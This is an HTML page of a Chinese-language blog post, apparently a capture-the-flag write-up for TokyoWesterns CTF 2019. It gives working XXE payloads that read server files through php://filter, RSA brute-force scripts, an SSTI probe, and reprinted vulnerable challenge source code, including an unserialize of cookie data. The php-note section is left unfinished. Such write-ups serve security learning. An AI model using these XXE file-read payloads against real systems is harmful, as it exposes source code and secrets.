@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="对未来的最大慷慨，就是把一切都献给现在。">
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        TokyoWestern 2019 - undefined
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/" />
+        </div>
+        <div class="name">
+            <i>Luc1fer</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TokyoWestern-2019"><span class="toc-text">TokyoWestern 2019</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ji2xji2"><span class="toc-text">ji2xji2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#real-baby-rsa"><span class="toc-text">real-baby-rsa</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-note"><span class="toc-text">php-note</span></a></li></ol></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        TokyoWestern 2019
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2019-09-05 17:20:26</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#SSTI" title="SSTI">SSTI</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#RSA" title="RSA">RSA</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h1 id="TokyoWestern-2019"><a href="#TokyoWestern-2019" class="headerlink" title="TokyoWestern 2019"></a>TokyoWestern 2019</h1><p>9/5/2019 5:20:26 PM 🎨</p>
+<h2 id="ji2xji2"><a href="#ji2xji2" class="headerlink" title="ji2xji2"></a>ji2xji2</h2><p>拿到题目第一反应就是XXE，直接拿着之前博客的payload一顿试，结果得到了<code>failed to decode xml</code>，然后就在想是不是思路错了，没想到是读的文件不存在，其实拿最简单的</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;
+&lt;creds&gt;
+&lt;user&gt;&amp;xxe;&lt;/user&gt;
+&lt;pass&gt;mypass&lt;/pass&gt;
+&lt;/creds&gt;</code></pre><p>就能看出来可以解析，因为觉得不可能这么简单就没有试…</p>
+<p>读源码</p>
+<pre><code>&lt;?xml version=&apos;1.0&apos;?&gt;
+&lt;!DOCTYPE mail[
+&lt;!ENTITY hacker SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt;
+]&gt;
+
+&lt;mail&gt;
+    &lt;message&gt;&amp;hacker;&lt;/message&gt;
+&lt;/mail&gt;</code></pre><p>这里我们要注意得到的加密后的数据在哪里结束</p>
+<p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g6vh6cdqqvj31d60dmwj2.jpg" alt="读源码"></p>
+<p>得到源码，从第一句得到<strong>flag</strong>的位置</p>
+<pre><code>&lt;?php
+**include &apos;flag.php&apos;;**
+
+$method = $_SERVER[&apos;REQUEST_METHOD&apos;];
+
+function die404($msg) {
+  http_response_code(404);
+  die($msg);
+}
+
+function check_type($obj) {
+  if (is_array($obj)) {
+    $key_is_str = function($obj) {
+      foreach($obj as $key=&gt;$val) {
+        if (is_int($key))
+          return false;
+      }
+      return true;
+    };
+
+    if ($key_is_str($obj)) {
+      return &apos;object&apos;;
+    }
+    else {
+      return &apos;array&apos;;
+    }
+  }
+  else {
+    return gettype($obj);
+  }
+}
+
+function json2xml($obj) {
+  $res = &apos;&apos;;
+
+  if (is_array($obj)) {
+    foreach($obj as $key =&gt; $val) {
+      switch(check_type($val)) {
+        case &apos;array&apos;:
+          foreach($val as $v) {
+            $res .= &quot;&lt;$key&gt;&quot;;
+            $res .= json2xml($v);
+            $res .= &quot;&lt;/$key&gt;&quot;;
+          }
+          break;
+        default: // object or primitive
+          $res .= &quot;&lt;$key&gt;&quot;;
+          $res .= json2xml($val);
+          $res .= &quot;&lt;/$key&gt;&quot;;
+          break;
+      }
+    }
+  }
+  else {
+    $res = (string)$obj;
+  }
+  return $res;
+}
+
+
+if ($method === &apos;POST&apos;) {
+  $jsonstr = $_POST[&apos;json&apos;];
+  $xmlstr = $_POST[&apos;xml&apos;];
+
+  if (!(empty($xmlstr) ^ empty($jsonstr))) {
+    die404(&apos;404&apos;);
+  }
+
+  if (!empty($jsonstr)) {
+    $obj = json_decode($jsonstr, true);
+    if (empty($obj)) {
+      die(&apos;failed to decode json&apos;);
+    }
+    $doc = new DOMDocument(&apos;1.0&apos;);
+    $doc-&gt;formatOutput = true;
+    $_obj = array();
+    $_obj[&apos;root&apos;] = $obj;
+    $doc-&gt;loadXML(json2xml($_obj));
+    echo $doc-&gt;saveXML();
+  }
+
+  if (!empty($xmlstr)) {
+    libxml_disable_entity_loader(false);
+    $obj = simplexml_load_string($xmlstr, &apos;SimpleXMLElement&apos;, LIBXML_NOENT);
+    if (empty($obj)) {
+      die(&apos;failed to decode xml&apos;);
+    }
+    echo json_encode($obj, JSON_PRETTY_PRINT);
+  }
+}
+else {
+?&gt;
+&lt;!doctype html&gt;
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;JSON &lt;-&gt; XML Converter&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;textarea id=&quot;json&quot; name=&quot;json&quot; rows=&quot;50&quot; cols=&quot;80&quot;&gt;
+    &lt;/textarea&gt;
+
+    &lt;input type=&quot;button&quot; id=&quot;x2j&quot; value=&quot;&lt;-&quot;/&gt;
+    &lt;input type=&quot;button&quot; id=&quot;j2x&quot; value=&quot;-&gt;&quot;/&gt;
+
+    &lt;textarea id=&quot;xml&quot; name=&quot;xml&quot; rows=&quot;50&quot; cols=&quot;80&quot;&gt;
+    &lt;/textarea&gt;
+
+    &lt;script
+      src=&quot;https://code.jquery.com/jquery-3.2.1.min.js&quot;
+      integrity=&quot;sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=&quot;
+      crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;
+    &lt;script&gt;
+      $.get(&apos;/sample.json&apos;, function(data) {
+        $(&apos;#json&apos;).val(data);
+      }, &apos;text&apos;);
+
+      $(&apos;#j2x&apos;).on(&apos;click&apos;, function() {
+        $.post(&apos;/&apos;, {
+          json: $(&apos;#json&apos;).val()
+        }, function(data) {
+          $(&apos;#xml&apos;).val(data);
+        });
+      });
+
+      $(&apos;#x2j&apos;).on(&apos;click&apos;, function() {
+        $.post(&apos;/&apos;, {
+          xml: $(&apos;#xml&apos;).val()
+        }, function(data) {
+          $(&apos;#json&apos;).val(data);
+        });
+      });
+    &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre><p>读flag</p>
+<pre><code>&lt;?xml version=&apos;1.0&apos;?&gt;
+&lt;!DOCTYPE mail[
+&lt;!ENTITY hacker SYSTEM &quot;php://filter/convert.base64-encode/resource=flag.php&quot;&gt;
+]&gt;
+
+&lt;mail&gt;
+    &lt;message&gt;&amp;hacker;&lt;/message&gt;
+&lt;/mail&gt;</code></pre><p>解密即可<br>    {<br>        “message”: “PD9waHAKJGZsYWcgPSAnVFdDVEZ7dDFueV9YWEVfc3QxbGxfZXgxc3RzX2V2ZXJ5d2hlcmV9JzsK”<br>    }</p>
+<pre><code>$flag = &apos;TWCTF{t1ny_XXE_st1ll_ex1sts_everywhere}&apos;;</code></pre><h2 id="real-baby-rsa"><a href="#real-baby-rsa" class="headerlink" title="real-baby-rsa"></a>real-baby-rsa</h2><p>告诉了我们N,e以及所有加密后的密文，直接爆破。(做的时候又是那样想的：怎么可能这么简单！(这么简单开始的时候还不知道替换掉换行符，搞了半天没做成😔(；′⌒`)))</p>
+<pre><code>#flag = &apos;TWCTF{CENSORED}&apos;
+#print(flag)
+# Public Parameters
+N = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091
+e = 65537
+
+
+# Encrypt the flag!
+
+#for i in flag1:
+for char in flag:
+    print(pow(ord(char), e, N))</code></pre><p>解密脚本：</p>
+<pre><code>import string
+#flag = &apos;TWCTF{CENSORED}&apos;
+
+flag = string.letters+string.digits+&quot;!@#$%^&amp;*()/{}_&quot;
+#print(flag)
+# Public Parameters
+N = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091
+e = 65537
+
+content = open(&quot;output&quot;).readlines()
+
+for line in content:
+    line = line.replace(&apos;\n&apos;, &apos;&apos;)
+    for char in flag:
+        #print char
+        #print(pow(ord(char), e, N))
+        m = pow(ord(char), e, N)
+        #print(m)
+        #print(line)
+        if str(m) == str(line):
+            #print(m)
+            print(char),
+            break</code></pre><p>再贴一个国外师傅写的，看起来就是比上面的优雅一点😀，别问为什么贴两个？问就是喜欢收集！</p>
+<pre><code>N = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091
+e = 65537
+
+#create ist ascii char
+list_ascii = []
+for i in range(33,126):
+    list_ascii.append(chr(i))
+
+#read each part of cipher text in to list
+lineList = list()
+lineList = [line.rstrip(&apos;\n&apos;) for line in open(&quot;output&quot;)]
+
+#starting burte force
+
+mesg = &quot;&quot;
+
+for cir in range(0,len(lineList)):
+    for m in list_ascii:
+        test_str = pow(ord(m),e,N)
+        test_str = str(test_str)
+        if(lineList[cir] in test_str):
+            mesg += m
+            break
+print(mesg)</code></pre><h2 id="php-note"><a href="#php-note" class="headerlink" title="php-note"></a>php-note</h2><pre><code>first name :1
+lastname: {{2*2}}</code></pre><p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g6vh6ett6fj30pe0d1wep.jpg" alt="登陆成功"></p>
+<p>查看源码得到hint:<code>http://phpnote.chal.ctf.westerns.tokyo/?action=source</code></p>
+<p>读源码</p>
+<pre><code> &lt;?php
+include &apos;config.php&apos;;
+
+class Note {
+    public function __construct($admin) {
+        $this-&gt;notes = array();
+        $this-&gt;isadmin = $admin;
+    }
+
+    public function addnote($title, $body) {
+        array_push($this-&gt;notes, [$title, $body]);
+    }
+
+    public function getnotes() {
+        return $this-&gt;notes;
+    }
+
+    public function getflag() {
+        if ($this-&gt;isadmin === true) {
+            echo FLAG;
+        }
+    }
+}
+
+function verify($data, $hmac) {
+    $secret = $_SESSION[&apos;secret&apos;];
+    if (empty($secret)) return false;
+    return hash_equals(hash_hmac(&apos;sha256&apos;, $data, $secret), $hmac);
+}
+
+function hmac($data) {
+    $secret = $_SESSION[&apos;secret&apos;];
+    if (empty($data) || empty($secret)) return false;
+    return hash_hmac(&apos;sha256&apos;, $data, $secret);
+}
+
+function gen_secret($seed) {
+    return md5(SALT . $seed . PEPPER);
+}
+
+function is_login() {
+    return !empty($_SESSION[&apos;secret&apos;]);
+}
+
+function redirect($action) {
+    header(&quot;Location: /?action=$action&quot;);
+    exit();
+}
+
+$method = $_SERVER[&apos;REQUEST_METHOD&apos;];
+$action = $_GET[&apos;action&apos;];
+
+if (!in_array($action, [&apos;index&apos;, &apos;login&apos;, &apos;logout&apos;, &apos;post&apos;, &apos;source&apos;, &apos;getflag&apos;])) {
+    redirect(&apos;index&apos;);
+}
+
+if ($action === &apos;source&apos;) {
+    highlight_file(__FILE__);
+    exit();
+}
+
+
+session_start();
+
+if (is_login()) {
+    $realname = $_SESSION[&apos;realname&apos;];
+    $nickname = $_SESSION[&apos;nickname&apos;];
+
+    $note = verify($_COOKIE[&apos;note&apos;], $_COOKIE[&apos;hmac&apos;])
+            ? unserialize(base64_decode($_COOKIE[&apos;note&apos;]))
+            : new Note(false);
+}
+
+if ($action === &apos;login&apos;) {
+    if ($method === &apos;POST&apos;) {
+        $nickname = (string)$_POST[&apos;nickname&apos;];
+        $realname = (string)$_POST[&apos;realname&apos;];
+
+        if (empty($realname) || strlen($realname) &lt; 8) {
+            die(&apos;invalid name&apos;);
+        }
+
+        $_SESSION[&apos;realname&apos;] = $realname;
+        if (!empty($nickname)) {
+            $_SESSION[&apos;nickname&apos;] = $nickname;
+        }
+        $_SESSION[&apos;secret&apos;] = gen_secret($nickname);
+    }
+    redirect(&apos;index&apos;);
+}
+
+if ($action === &apos;logout&apos;) {
+    session_destroy();
+    redirect(&apos;index&apos;);
+}
+
+if ($action === &apos;post&apos;) {
+    if ($method === &apos;POST&apos;) {
+        $title = (string)$_POST[&apos;title&apos;];
+        $body = (string)$_POST[&apos;body&apos;];
+        $note-&gt;addnote($title, $body);
+        $data = base64_encode(serialize($note));
+        setcookie(&apos;note&apos;, (string)$data);
+        setcookie(&apos;hmac&apos;, (string)hmac($data));
+    }
+    redirect(&apos;index&apos;);
+}
+
+if ($action === &apos;getflag&apos;) {
+    $note-&gt;getflag();
+}
+
+?&gt;
+&lt;!doctype html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;title&gt;PHP note&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;style&gt;
+        textarea {
+            resize: none;
+            width: 300px;
+            height: 200px;
+        }
+    &lt;/style&gt;
+    &lt;body&gt;
+        &lt;?php
+        if (!is_login()) {
+            $realname = htmlspecialchars($realname);
+            $nickname = htmlspecialchars($nickname);
+        ?&gt;
+        &lt;form action=&quot;/?action=login&quot; method=&quot;post&quot; id=&quot;login&quot;&gt;
+            &lt;input type=&quot;text&quot; id=&quot;firstname&quot; placeholder=&quot;First Name&quot;&gt;
+            &lt;input type=&quot;text&quot; id=&quot;lastname&quot; placeholder=&quot;Last Name&quot;&gt;
+            &lt;input type=&quot;text&quot; name=&quot;nickname&quot; id=&quot;nickname&quot; placeholder=&quot;nickname&quot;&gt;
+            &lt;input type=&quot;hidden&quot; name=&quot;realname&quot; id=&quot;realname&quot;&gt;
+            &lt;button type=&quot;submit&quot;&gt;Login&lt;/button&gt;
+        &lt;/form&gt;
+        &lt;?php
+        } else {
+        ?&gt;
+        &lt;h1&gt;Welcome, &lt;?=$realname?&gt;&lt;?= !empty($nickname) ? &quot; ($nickname)&quot; : &quot;&quot; ?&gt;&lt;/h1&gt;
+        &lt;a href=&quot;/?action=logout&quot;&gt;logout&lt;/a&gt;
+        &lt;!-- &lt;a href=&quot;/?action=source&quot;&gt;source&lt;/a&gt; --&gt;
+        &lt;br/&gt;
+        &lt;br/&gt;
+        &lt;?php
+            foreach($note-&gt;getnotes() as $k =&gt; $v) {
+                list($title, $body) = $v;
+                $title = htmlspecialchars($title);
+                $body = htmlspecialchars($body);
+        ?&gt;
+        &lt;h2&gt;&lt;?=$title?&gt;&lt;/h2&gt;
+        &lt;p&gt;&lt;?=$body?&gt;&lt;/p&gt;
+        &lt;?php
+            }
+        ?&gt;
+        &lt;form action=&quot;/?action=post&quot; method=&quot;post&quot;&gt;
+            &lt;input type=&quot;text&quot; name=&quot;title&quot; placeholder=&quot;title&quot;&gt;
+            &lt;br&gt;
+            &lt;textarea name=&quot;body&quot; placeholder=&quot;body&quot;&gt;&lt;/textarea&gt;
+            &lt;button type=&quot;submit&quot;&gt;Post&lt;/button&gt;
+        &lt;/form&gt;
+        &lt;?php
+        }
+        ?&gt;
+        &lt;?php
+        ?&gt;
+        &lt;script&gt;
+            document.querySelector(&quot;form#login&quot;).addEventListener(&apos;submit&apos;, (e) =&gt; {
+                const nickname = document.querySelector(&quot;input#nickname&quot;)
+                const firstname = document.querySelector(&quot;input#firstname&quot;)
+                const lastname = document.querySelector(&quot;input#lastname&quot;)
+                document.querySelector(&quot;input#realname&quot;).value = `${firstname.value} ${lastname.value}`
+                if (nickname.value.length == 0 &amp;&amp; firstname.value.length &gt; 0 &amp;&amp; lastname.value.length &gt; 0) {
+                    nickname.value = firstname.value.toLowerCase()[0] + lastname.value.toLowerCase()
+                }
+            })
+        &lt;/script&gt;
+    &lt;/body&gt;
+&lt;/html&gt; </code></pre><p>没做完，先留坑</p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = ""
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
